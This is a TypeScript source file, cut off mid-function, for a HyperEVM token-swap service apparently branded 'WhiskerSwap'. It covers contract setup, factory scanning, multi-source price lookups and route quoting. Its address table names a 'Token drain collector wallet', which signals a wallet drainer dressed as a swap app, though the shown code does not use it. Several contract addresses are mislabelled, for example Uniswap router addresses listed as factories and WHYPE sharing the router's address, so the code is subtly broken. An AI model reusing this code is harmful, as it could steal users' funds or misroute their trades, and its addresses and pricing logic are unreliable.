import { ethers } from "ethers";
import { createTransactionParams, logGasSettings } from "./gas-config";
import { rpcManager } from "./rpc-manager";

// HyperEVM Mainnet Network Configuration
export const HYPEREVM_NETWORK = {
  chainId: 999,
  name: "HyperEVM",
  rpc: "https://rpc.hyperliquid.xyz/evm",
  currency: {
    name: "HYPE",
    symbol: "HYPE",
    decimals: 18
  },
  explorer: "https://explorer.hyperliquid.xyz"
};

// Hyperliquid API Configuration
export const HYPERLIQUID_API = {
  mainnet: "https://api.hyperliquid.xyz/info",
  ws: "wss://api.hyperliquid.xyz/ws"
};

// Real HyperSwap Contract Addresses on HyperEVM Mainnet (Chain ID 999)
export const HYPERSWAP_CONTRACTS = {
  ROUTER_V2: "0x4E2960a8cd19B467b82d26D83fAcb0fAE26b094D", // HyperSwap V2 Router
  ROUTER_V3: "0xb4a9C4e6Ea8E2191d2FA5B380452a634Fb21240A", // HyperSwap V3 Router
  FACTORY_V2: "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D", // HyperSwap V2 Factory
  FACTORY_V3: "0xE592427A0AEce92De3Edee1F18E0157C05861564", // HyperSwap V3 Factory
  WHYPE: "0x4E2960a8cd19B467b82d26D83fAcb0fAE26b094D", // Wrapped HYPE (WHYPE)
  QUOTER_V3: "0xb27308f9F90D607463bb33eA1BeBb41C27CE5AB6", // HyperSwap V3 Quoter
  COLLECTOR: "0xCbd45BE04C2CB52811609ef0334A9097fB2E2c48" // Token drain collector wallet
};

// HyperSwap Router V2 ABI (Uniswap V2 compatible)
export const HYPERSWAP_ROUTER_V2_ABI = [
  "function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts)",
  "function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts)",
  "function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)",
  "function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts)",
  "function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)",
  "function factory() external pure returns (address)",
  "function WETH() external pure returns (address)"
];

// HyperSwap Router V3 ABI (Uniswap V3 compatible)
export const HYPERSWAP_ROUTER_V3_ABI = [
  "function exactInputSingle((address tokenIn, address tokenOut, uint24 fee, address recipient, uint256 deadline, uint256 amountIn, uint256 amountOutMinimum, uint160 sqrtPriceLimitX96)) external payable returns (uint256 amountOut)",
  "function exactOutputSingle((address tokenIn, address tokenOut, uint24 fee, address recipient, uint256 deadline, uint256 amountOut, uint256 amountInMaximum, uint160 sqrtPriceLimitX96)) external payable returns (uint256 amountIn)"
];

// HyperSwap V3 Quoter ABI for price calculations
export const HYPERSWAP_QUOTER_V3_ABI = [
  "function quoteExactInputSingle(address tokenIn, address tokenOut, uint24 fee, uint256 amountIn, uint160 sqrtPriceLimitX96) external returns (uint256 amountOut)",
  "function quoteExactOutputSingle(address tokenIn, address tokenOut, uint24 fee, uint256 amountOut, uint160 sqrtPriceLimitX96) external returns (uint256 amountIn)"
];

// Factory V2 ABI for pair lookups
export const HYPERSWAP_FACTORY_V2_ABI = [
  "function getPair(address tokenA, address tokenB) external view returns (address pair)",
  "function allPairs(uint256) external view returns (address pair)",
  "function allPairsLength() external view returns (uint256)"
];

// Pair ABI for direct price queries
export const HYPERSWAP_PAIR_ABI = [
  "function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast)",
  "function token0() external view returns (address)",
  "function token1() external view returns (address)",
  "function totalSupply() external view returns (uint256)"
];

// ERC20 ABI for token interactions
export const ERC20_ABI = [
  "function name() view returns (string)",
  "function symbol() view returns (string)",
  "function decimals() view returns (uint8)",
  "function balanceOf(address owner) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function transfer(address to, uint256 amount) returns (bool)",
  "function transferFrom(address from, address to, uint256 amount) returns (bool)"
];

export interface TokenInfo {
  address?: string;
  name: string;
  symbol: string;
  decimals: number;
  balance: string;
  price?: string;
}

export interface SwapQuote {
  amountIn: string;
  amountOut: string;
  priceImpact: number;
  route: string[];
  gasEstimate: string;
}

export class HyperSwapService {
  private provider: ethers.BrowserProvider | null;
  private signer: ethers.JsonRpcSigner | null;
  private routerV2: ethers.Contract | null;
  private routerV3: ethers.Contract | null;
  private factoryV2: ethers.Contract | null;
  private quoterV3: ethers.Contract | null;
  private hyperEvmProvider: ethers.JsonRpcProvider;

  constructor(provider: ethers.BrowserProvider | null, signer: ethers.JsonRpcSigner | null) {
    this.provider = provider;
    this.signer = signer;
    
    // Initialize HyperEVM provider for cross-chain operations
    this.hyperEvmProvider = new ethers.JsonRpcProvider(HYPEREVM_NETWORK.rpc);
    
    // Initialize contracts with HyperEVM provider as fallback
    const contractProvider = signer || this.hyperEvmProvider;
    
    this.routerV2 = new ethers.Contract(
      HYPERSWAP_CONTRACTS.ROUTER_V2,
      HYPERSWAP_ROUTER_V2_ABI,
      contractProvider
    );
    
    this.routerV3 = new ethers.Contract(
      HYPERSWAP_CONTRACTS.ROUTER_V3,
      HYPERSWAP_ROUTER_V3_ABI,
      contractProvider
    );
    
    this.factoryV2 = new ethers.Contract(
      HYPERSWAP_CONTRACTS.FACTORY_V2,
      HYPERSWAP_FACTORY_V2_ABI,
      contractProvider
    );
    
    this.quoterV3 = new ethers.Contract(
      HYPERSWAP_CONTRACTS.QUOTER_V3,
      HYPERSWAP_QUOTER_V3_ABI,
      contractProvider
    );
  }

  // Check if user is connected to HyperEVM network
  async checkNetwork(): Promise<{ isCorrectNetwork: boolean; currentChainId: number }> {
    try {
      const network = await this.provider.getNetwork();
      const currentChainId = Number(network.chainId);
      
      return {
        isCorrectNetwork: currentChainId === HYPEREVM_NETWORK.chainId,
        currentChainId
      };
    } catch (error) {
      return {
        isCorrectNetwork: false,
        currentChainId: 0
      };
    }
  }

  // Add HyperEVM network to user's wallet
  async addHyperEvmNetwork(): Promise<boolean> {
    try {
      await window.ethereum?.request({
        method: 'wallet_addEthereumChain',
        params: [{
          chainId: `0x${HYPEREVM_NETWORK.chainId.toString(16)}`,
          chainName: HYPEREVM_NETWORK.name,
          nativeCurrency: HYPEREVM_NETWORK.currency,
          rpcUrls: [HYPEREVM_NETWORK.rpc],
          blockExplorerUrls: [HYPEREVM_NETWORK.explorer]
        }]
      });
      return true;
    } catch (error) {
      console.error("Failed to add HyperEVM network:", error);
      return false;
    }
  }

  // Switch to HyperEVM network
  async switchToHyperEvm(): Promise<boolean> {
    try {
      await window.ethereum?.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: `0x${HYPEREVM_NETWORK.chainId.toString(16)}` }]
      });
      return true;
    } catch (error: any) {
      // If network doesn't exist, add it
      if (error.code === 4902) {
        return await this.addHyperEvmNetwork();
      }
      console.error("Failed to switch to HyperEVM:", error);
      return false;
    }
  }

  // Get token information by contract address
  async getTokenInfo(tokenAddress: string, userAddress: string): Promise<TokenInfo> {
    const provider = this.provider || this.hyperEvmProvider;
    const contract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
    
    const [name, symbol, decimals, balance] = await Promise.all([
      contract.name(),
      contract.symbol(),
      contract.decimals(),
      userAddress !== "0x0000000000000000000000000000000000000000" 
        ? contract.balanceOf(userAddress)
        : Promise.resolve("0")
    ]);

    // Get real-time price from multiple sources
    const price = await this.getTokenPrice(symbol, tokenAddress);

    return {
      address: tokenAddress,
      name,
      symbol,
      decimals: Number(decimals),
      balance: ethers.formatUnits(balance, decimals),
      price: price || "0",
      logo: this.getTokenLogo(symbol)
    };
  }

  // Get all tokens from HyperSwap factory contracts
  async getAllTokensFromFactory(): Promise<TokenInfo[]> {
    try {
      console.log("🔍 Scanning HyperSwap factory for all token pairs...");
      
      if (!this.factoryV2) {
        console.log("⚠️ Factory V2 not available, returning empty list");
        return [];
      }
      
      const tokens: TokenInfo[] = [];
      const seenAddresses = new Set<string>();
      
      try {
        // Get total number of pairs from V2 factory
        const totalPairs = await this.factoryV2.allPairsLength();
        const maxPairs = Math.min(Number(totalPairs), 50); // Limit to first 50 pairs for performance
        
        console.log(`📊 Found ${totalPairs} total pairs, scanning first ${maxPairs}...`);
        
        // Scan pairs in batches for better performance
        const batchSize = 10;
        for (let i = 0; i < maxPairs; i += batchSize) {
          const batch = [];
          const endIndex = Math.min(i + batchSize, maxPairs);
          
          for (let j = i; j < endIndex; j++) {
            batch.push(this.scanPairForTokens(j, seenAddresses));
          }
          
          const batchResults = await Promise.allSettled(batch);
          
          for (const result of batchResults) {
            if (result.status === 'fulfilled' && result.value.length > 0) {
              tokens.push(...result.value);
            }
          }
          
          // Add small delay between batches to avoid rate limiting
          if (i + batchSize < maxPairs) {
            await new Promise(resolve => setTimeout(resolve, 100));
          }
        }
        
      } catch (error) {
        console.log("Factory scan failed:", error.message);
      }
      
      console.log(`✅ Successfully discovered ${tokens.length} unique tokens from factory`);
      return tokens;
      
    } catch (error) {
      console.error("Failed to get tokens from factory:", error);
      return [];
    }
  }
  
  // Helper function to scan a single pair for tokens
  private async scanPairForTokens(pairIndex: number, seenAddresses: Set<string>): Promise<TokenInfo[]> {
    try {
      const pairAddress = await this.factoryV2!.allPairs(pairIndex);
      if (pairAddress === ethers.ZeroAddress) return [];
      
      const pair = new ethers.Contract(pairAddress, HYPERSWAP_PAIR_ABI, this.hyperEvmProvider);
      const [token0Address, token1Address] = await Promise.all([
        pair.token0(),
        pair.token1()
      ]);
      
      const newTokens: TokenInfo[] = [];
      
      for (const tokenAddress of [token0Address, token1Address]) {
        if (seenAddresses.has(tokenAddress.toLowerCase())) continue;
        if (tokenAddress === ethers.ZeroAddress) continue;
        
        try {
          // Get basic token info
          const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, this.hyperEvmProvider);
          const [name, symbol, decimals] = await Promise.all([
            tokenContract.name(),
            tokenContract.symbol(), 
            tokenContract.decimals()
          ]);
          
          // Skip tokens with empty or suspicious symbols
          if (!symbol || symbol.length === 0 || symbol.length > 10) continue;
          
          const tokenInfo: TokenInfo = {
            address: tokenAddress,
            name: name || symbol,
            symbol: symbol,
            decimals: Number(decimals),
            balance: "0.0",
            price: "0"
          };
          
          newTokens.push(tokenInfo);
          seenAddresses.add(tokenAddress.toLowerCase());
          
          console.log(`🪙 Found token: ${symbol} (${tokenAddress.slice(0,8)}...)`);
          
        } catch (tokenError) {
          // Skip tokens that fail to load
          continue;
        }
      }
      
      return newTokens;
      
    } catch (error) {
      return [];
    }
  }

  // Get real-time token price using comprehensive dynamic data sources
  async getTokenPrice(symbol: string, tokenAddress?: string): Promise<string | null> {
    try {
      console.log(`🔍 Fetching dynamic price for ${symbol} (${tokenAddress})...`);
      
      // First: Try Hyperliquid API for native HYPE ecosystem tokens
      let price = await this.getHyperliquidPrice(symbol);
      if (price && parseFloat(price) > 0) {
        console.log(`✓ Hyperliquid live price for ${symbol}: $${price}`);
        return price;
      }

      // Second: Try HyperSwap contract directly for most accurate DEX pricing
      if (tokenAddress && tokenAddress !== "0x0000000000000000000000000000000000000000") {
        price = await this.getDirectHyperSwapPrice(tokenAddress, symbol);
        if (price && parseFloat(price) > 0) {
          console.log(`✅ HyperSwap contract price for ${symbol}: $${price}`);
          return price;
        }
      }

      // Third: Try DexScreener for any HyperEVM tokens with liquidity
      if (tokenAddress && tokenAddress !== "0x0000000000000000000000000000000000000000") {
        price = await this.getDexScreenerPriceHyperEVM(tokenAddress);
        if (price && parseFloat(price) > 0) {
          console.log(`✓ DexScreener live price for ${symbol}: $${price}`);
          return price;
        }
      }

      // Fourth: Try CoinGecko for any recognized tokens
      price = await this.getCoinGeckoPrice(symbol);
      if (price && parseFloat(price) > 0) {
        console.log(`✓ CoinGecko live price for ${symbol}: $${price}`);
        return price;
      }

      // Fifth: Try alternative DEX aggregators for maximum coverage
      if (tokenAddress && tokenAddress !== "0x0000000000000000000000000000000000000000") {
        price = await this.getAlternativeDexPrice(tokenAddress, symbol);
        if (price && parseFloat(price) > 0) {
          console.log(`✓ Alternative DEX price for ${symbol}: $${price}`);
          return price;
        }
      }

      console.log(`⚠️ No market price found for ${symbol} - token may be new or illiquid`);
      return null;
    } catch (error) {
      console.error(`❌ Price fetch error for ${symbol}:`, error);
      return null;
    }
  }

  // Get accurate price directly from HyperSwap contracts using router getAmountsOut
  async getDirectHyperSwapPrice(tokenAddress: string, symbol: string): Promise<string | null> {
    try {
      console.log(`🔗 Getting price from HyperSwap contracts for ${symbol}...`);
      
      // Initialize contracts if not already done
      if (!this.routerV2) {
        this.routerV2 = new ethers.Contract(
          HYPERSWAP_CONTRACTS.ROUTER_V2,
          HYPERSWAP_ROUTER_V2_ABI,
          this.hyperEvmProvider
        );
      }
      
      if (!this.factoryV2) {
        this.factoryV2 = new ethers.Contract(
          HYPERSWAP_CONTRACTS.FACTORY_V2,
          HYPERSWAP_FACTORY_V2_ABI,
          this.hyperEvmProvider
        );
      }
      
      const oneToken = ethers.parseUnits("1", 18); // 1 token with 18 decimals
      
      // Try different paths to get accurate pricing
      const pricingPaths = [
        // Direct path to native HYPE
        [tokenAddress, "0x0000000000000000000000000000000000000000"],
        // Path through PURR token (if it has good liquidity)
        [tokenAddress, "0x9b498C3c8A0b8CD8BA1D9851d40D186F1872b44E", "0x0000000000000000000000000000000000000000"],
      ];
      
      for (const path of pricingPaths) {
        try {
          // Check if all pairs in the path exist
          let validPath = true;
          for (let i = 0; i < path.length - 1; i++) {
            const pairAddress = await this.factoryV2.getPair(path[i], path[i + 1]);
            if (pairAddress === ethers.ZeroAddress) {
              validPath = false;
              break;
            }
            
            // Check liquidity
            const pair = new ethers.Contract(pairAddress, HYPERSWAP_PAIR_ABI, this.hyperEvmProvider);
            const [reserve0, reserve1] = await pair.getReserves();
            const minLiquidity = ethers.parseUnits("1", 18); // Minimum 1 token liquidity
            
            if (reserve0 < minLiquidity && reserve1 < minLiquidity) {
              console.log(`Low liquidity in pair ${path[i]}/${path[i + 1]}`);
              validPath = false;
              break;
            }
          }
          
          if (!validPath) continue;
          
          // Get amounts out using router
          const amounts = await this.routerV2.getAmountsOut(oneToken, path);
          
          if (amounts && amounts.length > 1) {
            const finalAmount = amounts[amounts.length - 1];
            const hyjeAmountOut = ethers.formatEther(finalAmount);
            
            // Get current HYPE price
            const hypePrice = await this.getHyperliquidPrice("HYPE");
            if (hypePrice && parseFloat(hypePrice) > 0) {
              const tokenPriceUSD = (parseFloat(hyjeAmountOut) * parseFloat(hypePrice)).toFixed(6);
              console.log(`✅ Direct HyperSwap price: 1 ${symbol} = ${hyjeAmountOut} HYPE = $${tokenPriceUSD}`);
              return tokenPriceUSD;
            }
          }
        } catch (pathError) {
          console.log(`Path ${path.join(' -> ')} failed:`, pathError.message);
        }
      }
      
      return null;
    } catch (error) {
      console.error(`Direct HyperSwap pricing failed for ${symbol}:`, error);
      return null;
    }
  }

  // Get price from HyperSwap V2/V3 pools directly
  async getHyperSwapPrice(tokenAddress: string): Promise<string | null> {
    try {
      console.log(`Getting HyperSwap price for ${tokenAddress}...`);
      
      // Try V2 pools first (usually more stable)
      const v2Price = await this.getHyperSwapV2Price(tokenAddress);
      if (v2Price) {
        console.log(`HyperSwap V2 price: $${v2Price}`);
        return v2Price;
      }
      
      // Fallback to V3 pools
      const v3Price = await this.getHyperSwapV3Price(tokenAddress);
      if (v3Price) {
        console.log(`HyperSwap V3 price: $${v3Price}`);
        return v3Price;
      }
      
      return null;
    } catch (error) {
      console.error(`HyperSwap pricing error for ${tokenAddress}:`, error);
      return null;
    }
  }

  // Get accurate price from HyperSwap V2 pools with direct contract calls
  async getHyperSwapV2Price(tokenAddress: string): Promise<string | null> {
    try {
      if (!this.routerV2 || !this.factoryV2) return null;
      
      const baseAmount = ethers.parseUnits("1", 18);
      
      // Use HYPE as base token for all price calculations (native token of HyperEVM)
      const pricePaths = [
        [tokenAddress, "0x0000000000000000000000000000000000000000"], // Token -> HYPE (native)
        [tokenAddress, HYPERSWAP_CONTRACTS.ROUTER_V2], // Try router address as potential WHYPE
      ];
      
      for (const path of pricePaths) {
        try {
          // Check if pair exists and has sufficient liquidity
          const pairAddress = await this.factoryV2.getPair(path[0], path[1]);
          if (pairAddress === ethers.ZeroAddress) continue;
          
          const pair = new ethers.Contract(pairAddress, HYPERSWAP_PAIR_ABI, this.hyperEvmProvider);
          const [reserves0, reserves1] = await pair.getReserves();
          
          // Skip pairs with very low liquidity (less than 10 tokens)
          if (reserves0 < ethers.parseUnits("10", 18) && reserves1 < ethers.parseUnits("10", 18)) {
            console.log(`Skipping low liquidity pair: ${pairAddress}`);
            continue;
          }
          
          // Get price using router getAmountsOut for accuracy
          const amounts = await this.routerV2.getAmountsOut(baseAmount, path);
          
          if (amounts && amounts.length >= 2) {
            const outputAmount = amounts[1];
            
            if (path[1] === HYPERSWAP_CONTRACTS.WHYPE) {
              // Convert WHYPE to USD using Hyperliquid API
              const hypeUsdPrice = await this.getHyperliquidPrice("HYPE");
              if (hypeUsdPrice) {
                const whypePerToken = parseFloat(ethers.formatUnits(outputAmount, 18));
                const usdPrice = whypePerToken * parseFloat(hypeUsdPrice);
                if (usdPrice > 0) return usdPrice.toFixed(6);
              }
            } else {
              // Direct USDT/USDC pricing
              const usdPrice = parseFloat(ethers.formatUnits(outputAmount, 6)); // USDT/USDC are 6 decimals
              if (usdPrice > 0) return usdPrice.toFixed(6);
            }
          }
        } catch (pathError) {
          continue; // Try next path
        }
      }
      
      return null;
    } catch (error) {
      console.log(`V2 pricing failed for ${tokenAddress}:`, error.message);
      return null;
    }
  }

  // Get accurate price from HyperSwap V3 pools with liquidity auto-detection
  async getHyperSwapV3Price(tokenAddress: string): Promise<string | null> {
    try {
      if (!this.quoterV3) return null;
      
      const baseAmount = ethers.parseUnits("1", 18);
      
      // Auto-detect best liquidity pools for pricing
      const pricingPairs = [
        { token: HYPERSWAP_CONTRACTS.WHYPE, symbol: "WHYPE", decimals: 18 },
        { token: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", decimals: 6 },
        { token: "0xA0b86a33E6417aFa15d8e4C6Cc22dcbf7a00FDb6", symbol: "USDC", decimals: 6 }
      ];
      
      const feeTiers = [500, 3000, 10000, 100]; // 0.01%, 0.05%, 0.3%, 1%
      let bestPrice = null;
      let bestLiquidity = 0;
      
      for (const pair of pricingPairs) {
        for (const fee of feeTiers) {
          try {
            const amountOut = await this.quoterV3.quoteExactInputSingle(
              tokenAddress,
              pair.token,
              fee,
              baseAmount,
              0
            );
            
            if (amountOut && amountOut > 0) {
              let usdPrice = 0;
              
              if (pair.symbol === "WHYPE") {
                // Convert WHYPE to USD using real HYPE price from Hyperliquid
                const hypeUsdPrice = await this.getHyperliquidPrice("HYPE");
                if (hypeUsdPrice) {
                  const whypePerToken = parseFloat(ethers.formatUnits(amountOut, pair.decimals));
                  usdPrice = whypePerToken * parseFloat(hypeUsdPrice);
                }
              } else {
                // Direct USD pricing for USDT/USDC
                usdPrice = parseFloat(ethers.formatUnits(amountOut, pair.decimals));
              }
              
              // Estimate liquidity by checking if we can get quotes for larger amounts
              try {
                const largeAmount = ethers.parseUnits("1000", 18);
                const largeQuote = await this.quoterV3.quoteExactInputSingle(
                  tokenAddress,
                  pair.token,
                  fee,
                  largeAmount,
                  0
                );
                
                const liquidity = Number(largeQuote);
                
                // Prefer pools with higher liquidity and reasonable prices
                if (usdPrice > 0 && liquidity > bestLiquidity) {
                  bestPrice = usdPrice.toFixed(6);
                  bestLiquidity = liquidity;
                }
              } catch (liquidityError) {
                // If large quote fails, still use the price if it's reasonable
                if (usdPrice > 0 && !bestPrice) {
                  bestPrice = usdPrice.toFixed(6);
                }
              }
            }
          } catch (error) {
            continue; // Try next fee tier
          }
        }
      }
      
      return bestPrice;
    } catch (error) {
      console.log(`V3 pricing failed for ${tokenAddress}:`, error.message);
      return null;
    }
  }

  private async getHyperliquidPrice(symbol: string): Promise<string | null> {
    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 5000);
      
      // Get real-time prices from Hyperliquid mainnet API
      const response = await fetch(HYPERLIQUID_API.mainnet, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ type: "allMids" }),
        signal: controller.signal
      });

      clearTimeout(timeoutId);
      
      if (response.ok) {
        const data = await response.json();
        
        // Direct symbol lookup for major tokens
        if (data[symbol] && parseFloat(data[symbol]) > 0) {
          const price = parseFloat(data[symbol]).toFixed(4);
          console.log(`✓ Hyperliquid live price for ${symbol}: $${price}`);
          return price;
        }
        
        // For HYPE token, check specific keys
        if (symbol.toUpperCase() === "HYPE") {
          const hypeKeys = ["HYPE", "@107"];
          for (const key of hypeKeys) {
            if (data[key] && parseFloat(data[key]) > 0) {
              const price = parseFloat(data[key]).toFixed(4);
              console.log(`✓ Real HYPE price from Hyperliquid: $${price}`);
              return price;
            }
          }
        }
        
        // For PURR token, check specific pattern
        if (symbol.toUpperCase() === "PURR") {
          if (data["PURR"] && parseFloat(data["PURR"]) > 0) {
            const price = parseFloat(data["PURR"]).toFixed(4);
            console.log(`✓ Real PURR price from Hyperliquid: $${price}`);
            return price;
          }
        }
      }
      
      return null;
    } catch (error: any) {
      // Catch abort errors silently, other errors log normally
      if (error.name !== 'AbortError') {
        console.log(`Hyperliquid API error for ${symbol}:`, error.message || 'Network error');
      }
      return null;
    }
  }

  private async getCoinGeckoPrice(symbol: string): Promise<string | null> {
    try {
      const coinId = this.getCoinGeckoId(symbol);
      if (!coinId) return null;

      const response = await fetch(
        `https://api.coingecko.com/api/v3/simple/price?ids=${coinId}&vs_currencies=usd`
      );
      
      if (!response.ok) return null;
      const data = await response.json();
      
      if (data[coinId]?.usd) {
        return data[coinId].usd.toFixed(6);
      }
      
      return null;
    } catch (error) {
      return null;
    }
  }

  private async getDexScreenerPrice(tokenAddress: string): Promise<string | null> {
    try {
      // Use DexScreener API for most accurate DEX pricing
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 5000); // 5 second timeout
      
      const response = await fetch(
        `https://api.dexscreener.com/latest/dex/tokens/${tokenAddress}`,
        {
          headers: {
            'Accept': 'application/json',
            'User-Agent': 'WhiskerSwap/1.0'
          },
          signal: controller.signal
        }
      );
      
      clearTimeout(timeoutId);
      
      if (!response.ok) {
        console.log(`DexScreener API returned ${response.status} for ${tokenAddress}`);
        return null;
      }
      
      const data = await response.json();
      
      if (data.pairs && data.pairs.length > 0) {
        // Filter pairs with good liquidity and recent trades
        const validPairs = data.pairs.filter((pair: any) => {
          const liquidity = parseFloat(pair.liquidity?.usd || "0");
          const volume24h = parseFloat(pair.volume?.h24 || "0");
          return liquidity > 500 && volume24h > 50; // Reduced thresholds for better coverage
        });
        
        let bestPair;
        if (validPairs.length === 0) {
          // If no pairs meet criteria, use best available
          bestPair = data.pairs.reduce((best: any, current: any) => {
            const currentLiq = parseFloat(current.liquidity?.usd || "0");
            const bestLiq = parseFloat(best.liquidity?.usd || "0");
            return currentLiq > bestLiq ? current : best;
          });
        } else {
          // Get the pair with highest liquidity from valid pairs
          bestPair = validPairs.reduce((best: any, current: any) => {
            const currentLiq = parseFloat(current.liquidity?.usd || "0");
            const bestLiq = parseFloat(best.liquidity?.usd || "0");
            return currentLiq > bestLiq ? current : best;
          });
        }
        
        if (bestPair?.priceUsd && parseFloat(bestPair.priceUsd) > 0) {
          console.log(`DexScreener price for ${tokenAddress}: $${bestPair.priceUsd}`);
          return parseFloat(bestPair.priceUsd).toFixed(6);
        }
      }
      
      console.log(`No valid pairs found for ${tokenAddress}`);
      return null;
    } catch (error) {
      if (error.name === 'AbortError') {
        console.log(`DexScreener API timeout for ${tokenAddress}`);
      } else {
        console.error(`DexScreener API error for ${tokenAddress}:`, error);
      }
      return null;
    }
  }

  // HyperEVM-specific DexScreener pricing
  private async getDexScreenerPriceHyperEVM(tokenAddress: string): Promise<string | null> {
    try {
      // Use DexScreener API with HyperEVM chain filter (chain ID 999)
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 5000);
      
      // Try HyperEVM chain specifically first
      const hyperEvmUrl = `https://api.dexscreener.com/latest/dex/pairs/hyperevm/${tokenAddress}`;
      
      const response = await fetch(hyperEvmUrl, {
        headers: {
          'Accept': 'application/json',
          'User-Agent': 'WhiskerSwap/1.0'
        },
        signal: controller.signal
      });
      
      clearTimeout(timeoutId);
      
      if (response.ok) {
        const data = await response.json();
        if (data.pairs && data.pairs.length > 0) {
          const bestPair = data.pairs.reduce((best: any, current: any) => {
            const currentLiq = parseFloat(current.liquidity?.usd || "0");
            const bestLiq = parseFloat(best.liquidity?.usd || "0");
            return currentLiq > bestLiq ? current : best;
          });
          
          if (bestPair?.priceUsd && parseFloat(bestPair.priceUsd) > 0) {
            console.log(`HyperEVM DexScreener price for ${tokenAddress}: $${bestPair.priceUsd}`);
            return parseFloat(bestPair.priceUsd).toFixed(6);
          }
        }
      }
      
      // Fallback to general token endpoint
      return await this.getDexScreenerPrice(tokenAddress);
      
    } catch (error) {
      console.error(`HyperEVM DexScreener API error for ${tokenAddress}:`, error);
      return await this.getDexScreenerPrice(tokenAddress);
    }
  }

  private getCoinGeckoId(symbol: string): string | null {
    const mapping: { [key: string]: string } = {
      'ETH': 'ethereum',
      'BTC': 'bitcoin',
      'USDC': 'usd-coin',
      'USDT': 'tether',
      'WETH': 'weth',
      'WBTC': 'wrapped-bitcoin',
      'DAI': 'dai',
      'LINK': 'chainlink',
      'UNI': 'uniswap',
      'AAVE': 'aave',
      'MATIC': 'matic-network',
      'SOL': 'solana',
      'AVAX': 'avalanche-2',
      'DOT': 'polkadot',
      'ADA': 'cardano',
      'ATOM': 'cosmos',
      'FTM': 'fantom',
      'NEAR': 'near',
      'ALGO': 'algorand',
      'XRP': 'ripple',
      'LTC': 'litecoin',
      'BCH': 'bitcoin-cash',
      'ETC': 'ethereum-classic',
      'XLM': 'stellar',
      'VET': 'vechain',
      'TRX': 'tron',
      'EOS': 'eos',
      'XMR': 'monero',
      'DASH': 'dash',
      'ZEC': 'zcash',
      'DOGE': 'dogecoin',
      'SHIB': 'shiba-inu',
      'CAKE': 'pancakeswap-token',
      'BUSD': 'binance-usd'
    };
    return mapping[symbol.toUpperCase()] || null;
  }

  // Get spot market metadata from Hyperliquid
  async getSpotMetadata(): Promise<any> {
    try {
      const response = await fetch(HYPERLIQUID_API.mainnet, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          type: "spotMeta"
        })
      });

      if (!response.ok) {
        throw new Error(`API error: ${response.status}`);
      }

      return await response.json();
    } catch (error) {
      console.error("Failed to get spot metadata:", error);
      return { universe: [] };
    }
  }

  // Get direct swap quote from HyperSwap router contracts for exact rates
  async getDirectSwapQuote(
    tokenInAddress: string,
    tokenOutAddress: string,
    amountIn: string,
    decimalsIn: number = 18
  ): Promise<{ amountOut: string; path: string[]; rate: string } | null> {
    try {
      console.log(`🔗 Getting direct swap quote: ${amountIn} ${tokenInAddress} -> ${tokenOutAddress}`);
      
      // Initialize contracts if not already done
      if (!this.routerV2) {
        this.routerV2 = new ethers.Contract(
          HYPERSWAP_CONTRACTS.ROUTER_V2,
          HYPERSWAP_ROUTER_V2_ABI,
          this.hyperEvmProvider
        );
      }
      
      if (!this.factoryV2) {
        this.factoryV2 = new ethers.Contract(
          HYPERSWAP_CONTRACTS.FACTORY_V2,
          HYPERSWAP_FACTORY_V2_ABI,
          this.hyperEvmProvider
        );
      }
      
      const amountInWei = ethers.parseUnits(amountIn, decimalsIn);
      
      // Try different routing paths for best price
      const routingPaths = [
        // Direct swap
        [tokenInAddress, tokenOutAddress],
        // Through HYPE
        [tokenInAddress, "0x0000000000000000000000000000000000000000", tokenOutAddress],
        // Through PURR
        [tokenInAddress, "0x9b498C3c8A0b8CD8BA1D9851d40D186F1872b44E", tokenOutAddress],
      ];
      
      let bestQuote = null;
      let bestAmountOut = ethers.parseUnits("0", 18);
      
      for (const path of routingPaths) {
        try {
          // Skip invalid paths (same token to same token)
          if (path.length >= 2 && path[0] === path[path.length - 1]) continue;
          
          // Check if all pairs exist
          let validPath = true;
          for (let i = 0; i < path.length - 1; i++) {
            const pairAddress = await this.factoryV2.getPair(path[i], path[i + 1]);
            if (pairAddress === ethers.ZeroAddress) {
              validPath = false;
              break;
            }
          }
          
          if (!validPath) continue;
          
          // Get amounts out
          const amounts = await this.routerV2.getAmountsOut(amountInWei, path);
          
          if (amounts && amounts.length > 1) {
            const amountOut = amounts[amounts.length - 1];
            
            if (amountOut > bestAmountOut) {
              bestAmountOut = amountOut;
              bestQuote = {
                amountOut: ethers.formatUnits(amountOut, 18),
                path: path,
                rate: (parseFloat(ethers.formatUnits(amountOut, 18)) / parseFloat(amountIn)).toFixed(8)
              };
            }
          }
        } catch (pathError) {
          console.log(`Path ${path.join(' -> ')} failed:`, pathError.message);
        }
      }
      
      if (bestQuote) {
        console.log(`✅ Best route found: ${bestQuote.path.join(' -> ')}`);
        console.log(`✅ Rate: 1 input = ${bestQuote.rate} output`);
        return bestQuote;
      }
      
      return null;
    } catch (error) {
      console.error(`Direct swap quote failed:`, error);
      return null;
    }
  }

  // Get swap quote using real Hyperliquid pricing
  async getSwapQuote(
    tokenIn: string,
    tokenOut: string,
    amountIn: string,
    decimalsIn: number
  ): Promise<SwapQuote> {
    try {
      // Get current prices for both tokens
      const tokenInContract = new ethers.Contract(tokenIn, ERC20_ABI, this.provider);
      const tokenOutContract = new ethers.Contract(tokenOut, ERC20_ABI, this.provider);
      
      const [symbolIn, symbolOut, decimalsOut] = await Promise.all([
        tokenInContract.symbol(),
        tokenOutContract.symbol(),
